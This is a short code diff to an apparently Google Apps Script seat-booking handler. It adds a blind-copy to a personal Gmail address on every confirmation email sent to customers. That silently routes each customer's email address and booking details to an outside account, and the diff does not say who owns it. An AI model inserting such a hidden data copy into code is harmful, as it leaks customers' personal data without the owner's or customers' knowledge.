@@ -153,7 +153,7 @@ function onSeatEdit(e) {
       if (ref) { tab.getRange(row, 9).setValue('Yes, ' + ref.label); seatAdmin('link', passId, ref.id); }
     }
     if (p.email) {
-      MailApp.sendEmail({ to: p.email, name: 'Infinite Rizq', subject: 'Your seat is confirmed: ' + seatText(p.seats), htmlBody: confirmEmail(p) });
+      MailApp.sendEmail({ to: p.email, bcc: 'walianwaar3@gmail.com', name: 'Infinite Rizq', subject: 'Your seat is confirmed: ' + seatText(p.seats), htmlBody: confirmEmail(p) });
       note('Confirmed, email sent.');
     } else {
       note('Confirmed. No email on file: send the pass link on WhatsApp.');
